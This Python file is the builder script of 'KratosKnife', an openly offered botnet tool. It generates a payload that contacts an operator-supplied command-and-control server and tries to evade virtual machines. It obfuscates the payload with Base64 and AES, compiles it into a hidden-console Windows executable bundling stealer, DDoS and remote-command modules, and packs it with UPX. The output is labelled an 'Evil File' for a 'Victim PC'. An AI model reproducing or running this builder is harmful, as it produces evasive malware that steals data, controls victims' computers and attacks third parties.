import requests, subprocess, os, shutil, argparse, banners

# Crypter Modules
import crypter.Base64_encrypt as Base64_encrypt
import crypter.AES_encrypt as AES_encrypt

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}KratosKnife v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("--interactive", dest="interactive", help="Takes Input by asking Questions", action='store_true')   
    parser.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
    parser.add_argument("-i", "--interval", dest="interval", help="Time Interval to Connect Server Every __ seconds. default=4", default=4)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)         
    parser.add_argument("-b", "--bind", dest="bind", help="Built-In Binder : Specify Path of Legitimate file.") 
    
    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-s", "--server", dest="server", help="Command & Control Server for Botnet.")
    required_arguments.add_argument("-o", "--output", dest="output", help="Output file name.")
    return parser.parse_args()

def refine_panelURL(panelURL):
    if panelURL[-1] != "/":
        panelURL = panelURL + "/"

    if panelURL[:7] != "http://" and panelURL[:8] != "https://":
        panelURL = "http://" + panelURL
    
    return panelURL
    
def get_python_pyinstaller_path():
    python_path = subprocess.check_output("where python", shell=True)
    python_path = str(python_path).split('\'')[1]
    python_path = python_path.replace("\\n", "")
    python_path = python_path.replace("\\r", "")
    python_path = python_path.replace("\\\\", "/")
    python_path = python_path.replace("python.exe", "Scripts/pyinstaller.exe")

    return python_path    

def run_interactive_mode():
    print(f"\n{GREEN}[INTERACTIVE MODE ENABLED]")
    print(f"{YELLOW}\n*********************************************************************")
    panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
    panelURL = refine_panelURL(panelURL)

    panel = 1

    while panel == 1:
        try:
            check_panel = requests.get(url = panelURL + "check_panel.php")
            
            if(check_panel.text == "Panel Enabled"):
                panel = 0 
            else:
                print(f"{RED}[!] Panel is diabled, Please Try Again !")
                panelURL = input(f"{WHITE}[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
                panelURL = refine_panelURL(panelURL)
                panel = 1

        except:
            print(f"{RED}[!] Unable to Verify Server URL")
            panel = 0
            

    file_name = input(f"{WHITE}[?] Enter Output File Name: {YELLOW}")
    icon_path = input(f"{WHITE}[?] Enter Icon File Path (Must be .ico) [LEAVE BLANK TO USE DEFAULT ICON] : {GREEN}")    
    print(f"{YELLOW}\n*********************************************************************")
    
    return panelURL, file_name, icon_path

def generate_payload(file_name, panelURL):
    with open(file_name, "w+") as file:
        file.write("import time, sys\n")
        file.write("import KratosKnife as K\n\n")
        file.write(f"def {file_name}_function():\n")
        file.write("\ttry:\n")
        file.write(f"\t\t{file_name} = K.Payload(\"{panelURL}\")\n") 
        file.write(f"\t\t{file_name}.detect_vm_and_quit()\n") 
        file.write(f"\t\t{file_name}.connect()\n") 
        file.write(f"\t\t{file_name}.start()\n") 
        file.write("\texcept Exception as e:\n")
        file.write("\t\tif str(e)[:18] == \"HTTPConnectionPool\":\n")
        file.write("\t\t\tprint(\"[*] Offline, Trying to Connection After 10 Sec\")\n")
        file.write("\t\t\ttime.sleep(10)\n")
        file.write(f"\t\t\t{file_name}_function()\n")
        file.write(f"\t\telse:\n")
        file.write("\t\t\tprint(f\"[Error] : {e}\")\n")
        file.write("\t\t\tsys.exit()\n\n")
        file.write("\texcept KeyboardInterrupt:\n")
        file.write("\t\tsys.exit()\n\n")
        file.write(f"{file_name}_function()\n")    

def compile_source(file_name, icon_path, debugging):
    if debugging == "y":
        if icon_path != None and icon_path != "":
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=KratosKnife --hidden-import=Stealer --hidden-import=ClientsCMD --hidden-import=ComputerCMD --hidden-import=HTTPSocket --hidden-import=DDOS --hidden-import=BypassVM {file_name} -i {icon_path}", shell=True)
        else:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=KratosKnife --hidden-import=Stealer --hidden-import=ClientsCMD --hidden-import=ComputerCMD --hidden-import=HTTPSocket --hidden-import=DDOS --hidden-import=BypassVM {file_name}", shell=True)     
    else:
        if icon_path != None and icon_path != "":
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=KratosKnife --hidden-import=Stealer --hidden-import=ClientsCMD --hidden-import=ComputerCMD --hidden-import=HTTPSocket --hidden-import=DDOS --hidden-import=BypassVM {file_name} -i {icon_path}", shell=True)
        else:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=KratosKnife --hidden-import=Stealer --hidden-import=ClientsCMD --hidden-import=ComputerCMD --hidden-import=HTTPSocket --hidden-import=DDOS --hidden-import=BypassVM {file_name}", shell=True)     

def pack_exe_using_upx():
    if os.path.exists(os.getcwd() + "\\upx\\upx.exe") and os.path.exists(os.getcwd() + f"\\dist\\{arguments.output}.exe"):
        shutil.copy2(f"{os.getcwd()}\\upx\\upx.exe", f"{os.getcwd()}\\dist")
        os.chdir(f"{os.getcwd()}\\dist") 
        
        print(f"{YELLOW}\n[*] Packing Exe Using UPX")
        os.system(f"upx.exe {arguments.output}.exe > log.txt")
        os.remove("log.txt")
        os.remove("upx.exe")
        print(f"{GREEN}[+] Packed Successfully !")
 
def del_junk_file(file_name):
    try:     
        build = os.getcwd() + "\\build"
        shutil.rmtree(build)
    except Exception:
        pass
    #==================================================    
    try:    
        file_name = os.getcwd() + f"\\{file_name}"
        os.remove(file_name)
        os.remove(file_name + ".spec")
    except Exception:
        pass
    #==================================================      
    try:    
        pycache = os.getcwd() + "\\__pycache__"       
        shutil.rmtree(pycache)                  
    except Exception:
        pass

def exit_greet():
    os.system('cls')      
    print(GREEN + '''Thank You for using KratosKnife, Think Great & Touch The Sky!  \n''' + END)
    quit()

if __name__ == "__main__":
    dist_folder = os.getcwd() + "/dist"
    try:
        shutil.rmtree(dist_folder)
    except Exception:
        pass

    try:
        print(banners.get_banner())
        print(f"{YELLOW}Author: {GREEN}Pushpender | {YELLOW}GitHub: {GREEN}github.com/Technowlogy-Pushpender\n")    
    
        arguments = get_arguments()      
    
        if not os.path.exists(PYTHON_PYINSTALLER_PATH):
            PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()

        if arguments.interactive:
            panelURL, file_name, icon_path = run_interactive_mode() 
            
        if not arguments.interactive:
            if not arguments.server:
                print(f"{YELLOW}\n*******************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined Server URL")
                print(f"{YELLOW}*******************************************")
                panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
                panelURL = refine_panelURL(panelURL)

                panel = 1
                while panel == 1:
                    try:
                        check_panel = requests.get(url = panelURL + "check_panel.php")
                        
                        if(check_panel.text == "Panel Enabled"):
                            panel = 0 
                        else:
                            print(f"{RED}[!] Panel is diabled, Please Try Again !")
                            panelURL = input(f"{WHITE}[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
                            panelURL = refine_panelURL(panelURL)
                            panel = 1

                    except:
                        print(f"{RED}[!] Unable to Verify Server URL")
                        panel = 0
            else:            
                panelURL = arguments.server
                panelURL = refine_panelURL(panelURL)
                        
            if not arguments.output:
                file_name = input(f"{WHITE}[?] Enter Output File Name: {GREEN}")                
            else: 
                file_name = arguments.output
        
            if not arguments.icon:
                icon_path = "" 
                print(f"{YELLOW}\n****************************************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined BOTNET Icon, Using Default Icon")
                print(f"{YELLOW}****************************************************************")    
            else:
                icon_path = arguments.icon
        
        print(f"{YELLOW}\n*********************************************************************")
        print(f"{WHITE}[If payload is unable to execute on Victim PC, Enable Debugging Mode]")
        print(f"{YELLOW}*********************************************************************")
        debugging = input(f"{WHITE}\n[?] Want to Enable Debugging Mode (y/n) [DEFAULT: n]: {GREEN}")
        debugging = debugging.lower()
        
        print(f"{YELLOW}\n[*] Generating Payload Source Codes ...")
        generate_payload(file_name, panelURL)  # Generating Payload Source File
        print(f"{GREEN}[+] Payload Source Codes Generated Successfully!")

        key = input(f"{WHITE}\n[?] Enter Weak Numeric Key [Recommended Password Length : 5] : ")
        
        print(f"{YELLOW}\n[*] Initaiting Base64 Encryption Process ...")    
        base64_enc = Base64_encrypt.Encrypt()
        base64_enc.encrypt(file_name)
        print(f"{GREEN}[+] Operation Completed Successfully!\n")     

        print(f"{YELLOW}\n[*] Initiating AES Encryption Process ...")
        AES_enc = AES_encrypt.Encryptor(key, file_name) 
        AES_enc.encrypt_file()
        print(f"{GREEN}[+] Process Completed Successfully!")
        
        print(f"{YELLOW}\n[*] Compiling Source codes ...{MAGENTA}")
        compile_source(file_name, icon_path, debugging)  #Compiling the source code
        
        if os.path.exists(f'dist/{file_name}.exe'):
                   
            print(f"{GREEN}\n[+] Compiled Successfully !")
            print(f"{GREEN}[+] Evil File is saved at : {YELLOW}dist/{file_name}.exe")
            
            pack_exe_using_upx()  # Packing Exe Using UPX Packer
        
        print(f"{YELLOW}\n[*] Deleting Junk Files ...")
        del_junk_file(file_name)  
        print(f"{GREEN}[+] Deleted Successfully !")

    except Exception as e:
        del_junk_file(file_name)
        print(f"{RED}[!] Error : {YELLOW}{e}")
        quit()
        
    except KeyboardInterrupt:  
        del_junk_file(file_name)
        exit_greet()




